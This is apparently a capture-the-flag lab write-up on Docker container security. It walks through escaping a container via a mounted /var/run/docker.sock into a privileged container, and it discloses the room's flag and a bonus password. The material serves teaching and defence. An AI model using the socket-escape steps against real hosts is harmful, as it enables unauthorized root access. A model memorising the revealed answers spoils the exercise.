# **Containers – DoorDasher’s Demise**

---

## **Task 1 – Introduction**

### **Scenario Overview**

- DoorDasher web service defaced → renamed to **Hopperoo**
- SOC team **locked out of host**
- Access still available via **monitoring container**
- Goal:

  - Investigate Docker environment
  - Escape container
  - Escalate privileges
  - Restore original service

---

## **Learning Objectives**

- Understand container architecture
- Learn Docker runtime & sockets
- Identify container escape vectors
- Perform privilege escalation via Docker
- Restore compromised service

---

## **Task 2 – Container Security**

---

## **What Are Containers?**

- Lightweight application isolation
- Bundle:

  - Application
  - Dependencies
  - Runtime config

- Share **host OS kernel**
- Faster & lighter than VMs

---

## **Containers vs Virtual Machines**

| Feature   | Containers    | Virtual Machines  |
| --------- | ------------- | ----------------- |
| Kernel    | Shared        | Separate          |
| Size      | Lightweight   | Heavy             |
| Startup   | Fast          | Slow              |
| Isolation | Process-level | Full OS           |
| Use Case  | Microservices | Full OS workloads |

---

## **Why Containers Are Used**

- Dependency isolation
- Easy deployment
- Rapid scaling
- Microservice architecture support

---

## **Docker Basics**

### **Docker Components**

- **Docker Engine** → manages containers
- **Dockerfile** → build instructions
- **Images** → read-only templates
- **Containers** → running instances

---

## **Docker Runtime & Sockets**

### **Docker Architecture**

- Client ↔ Docker Daemon
- Communication via:

  - **Unix socket**: `/var/run/docker.sock`

### **Why the Socket Is Dangerous**

- Full Docker API access
- Root-equivalent on host
- If accessible inside container → **container escape**

---

## **Container Escape Concept**

A **container escape** occurs when:

- Code inside container interacts with Docker daemon
- Attacker gains:

  - Host access
  - Other containers
  - Privileged execution

### **Common Causes**

- Docker socket mounted into container
- Privileged containers
- Misconfigured permissions

---

## **Task 3 – Practical Exploitation**

---

## **Step 1: Enumerate Containers**

```bash
docker ps
```

- Lists running containers
- Identifies interesting services

---

## **Step 2: Access Monitoring Container**

```bash
docker exec -it uptime-checker sh
```

---

## **Step 3: Check Docker Socket Access**

```bash
ls -la /var/run/docker.sock
```

- If readable/writable → **escape possible**

---

## **Step 4: Confirm Docker Control**

```bash
docker ps
```

- If this works inside container → **Docker daemon access confirmed**

---

## **Step 5: Access Privileged Container**

```bash
docker exec -it deployer bash
```

- Higher privileges
- Access recovery script

---

## **Step 6: Restore Service**

```bash
whoami
sudo /recovery_script.sh
```

- Restores DoorDasher service
- Website fixed at port `5001`

---

## **Step 7: Retrieve Flag**

```bash
cat /flag
```

---

## **Task Questions**

### **What exact command lists running Docker containers?**

<details>
  <summary>Click to reveal the answer</summary>

**docker ps**

</details>

---

### **What file is used to define the instructions for building a Docker image?**

<details>
  <summary>Click to reveal the answer</summary>

**Dockerfile**

</details>

---

### **What’s the flag?**

search for file called flag.txt

<details>
  <summary>Click to reveal the answer</summary>

**THM{DOCKER_ESCAPE_SUCCESS}**

</details>

---

## **Bonus Question**

### **What is the secret password found on the news site (port 5002)?**

dont overthing it right infront of you, no nmap developertool nothing

<details>
  <summary>Click to reveal the answer</summary>

**DeployMaster2025!**

</details>

---

## ✅ **Key Security Takeaways**

- Containers ≠ security boundary
- Docker socket access = **root-level risk**
- Never expose `/var/run/docker.sock`
- Use:

  - Least privilege
  - Rootless containers
  - Enhanced Container Isolation

- Monitor for:

  - Privileged containers
  - Unexpected Docker API access

---
